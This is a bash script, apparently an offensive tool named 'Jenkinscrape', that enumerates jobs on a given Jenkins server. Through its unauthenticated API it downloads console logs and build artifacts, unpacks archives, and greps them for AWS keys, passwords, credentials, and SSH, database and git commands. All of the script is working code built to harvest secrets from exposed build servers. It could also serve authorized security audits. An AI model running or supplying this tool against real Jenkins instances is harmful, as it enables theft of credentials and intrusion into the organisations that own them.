#!/bin/bash

command -v jq >/dev/null 2>&1 || { echo >&2 "jq needed - install it"; exit 1; }

cat<<1337


     ██╗███████╗███╗   ██╗██╗  ██╗███████╗ ██████╗██████╗  █████╗ ██████╗ ███████╗
     ██║██╔════╝████╗  ██║██║ ██╔╝██╔════╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝
     ██║█████╗  ██╔██╗ ██║█████╔╝ ███████╗██║     ██████╔╝███████║██████╔╝█████╗
██   ██║██╔══╝  ██║╚██╗██║██╔═██╗ ╚════██║██║     ██╔══██╗██╔══██║██╔═══╝ ██╔══╝
╚█████╔╝███████╗██║ ╚████║██║  ██╗███████║╚██████╗██║  ██║██║  ██║██║     ███████╗
 ╚════╝ ╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝

                                                                 by maraud3r
1337

JENKINS="https://$1"
SCRAPEDIR=$(mktemp -d)
echo "[*] Scraping will be stored in ${SCRAPEDIR}"
echo -n "[*] Collecting job list..............."
curl -s "${JENKINS}/api/json?pretty=true" | jq '.jobs[]|.url ' | sed 's/"//g' | cat > ${SCRAPEDIR}/jobs.lst
echo "DONE"
TOT_JOBS=$(wc -l ${SCRAPEDIR}/jobs.lst | cut -d' ' -f 1)
NUM=1

while read JOB
do
    echo -ne "[*] Scraping jobs.............[$NUM/$TOT_JOBS]\r"
    SCRAPEFILE=${SCRAPEDIR}/$NUM.txt

    # scrape console
    curl -s $JOB/lastSuccessfulBuild/consoleText | sort -u  > ${SCRAPEFILE}

    GIT="git clone "
    AWS="AWS_SECRET_KEY|AWS_ACCESS_KEY_ID"
    TAR="tar -?[xvfz] "
    SSH="ssh \w+\@"
    CURL="curl "
    DB="mysql |psql |mongo "
    HTTP="(https|http)://"
    PASS="password |passphrase |pwd |credentials |userpass "
    grep -Pa "(${GIT}|${AWS}|${TAR}|${SSH}|${CURL}|${DB}|${HTTP}|${PASS})" ${SCRAPEFILE} >> ${SCRAPEDIR}/scraping.res

    # scrape artefact files one by one
    ARTIFACTS=${SCRAPEDIR}/artifacts.txt
    curl -s "$JOB/lastSuccessfulBuild/api/json?pretty_print=true" | jq '.artifacts[].relativePath' | sort -u | sed 's/"//g' > ${ARTIFACTS}
    [ -s ${ARTIFACTS} ] || continue
    while read ARTIFACT
    do
	ARTIFACT_DIR=$(mktemp -d -p ${SCRAPEDIR})
	pushd ${ARTIFACT_DIR} &> /dev/null
	wget -q "$JOB/lastSuccessfulBuild/artifact/${ARTIFACT}"
	ARTIFACT_FILE=$(basename ${ARTIFACT})
	RES=$(file ${ARTIFACT_FILE} | cut -d' ' -f 2-)
	case "${RES}" in
	    data) ;;
	    ASCII*) ;;
	    Zip*)
		unzip ${ARTIFACT_FILE} &> /dev/null
		rm ${ARTIFACT_FILE}
		;;
	    POSIX\ tar\ archive*)
		tar xf ${ARTIFACT_FILE}
		rm ${ARTIFACT_FILE}
		;;
	    gzip\ compressed\ data*)
		gunzip ${ARTIFACT_FILE}
		;;
	    *)
		echo "unknown file format for ${ARTIFACT_FILE}"
		;;
	esac
	grep -Pr "(${GIT}|${AWS}|${SSH}|${CURL}|${DB}|${PASS})" . >> ${SCRAPEDIR}/scraping.res
	popd &> /dev/null
	rm -rf ${ARTIFACT_DIR}

    done<${ARTIFACTS}

    rm ${ARTIFACTS}
    rm ${SCRAPEFILE}

    NUM=$(($NUM+1))
done<${SCRAPEDIR}/jobs.lst
echo "[*] Scraping jobs.....................DONE"

echo -n "[*] Sorting and fixing up output......"
sort -u -o ${SCRAPEDIR}/scraping.res ${SCRAPEDIR}/scraping.res
echo "DONE"
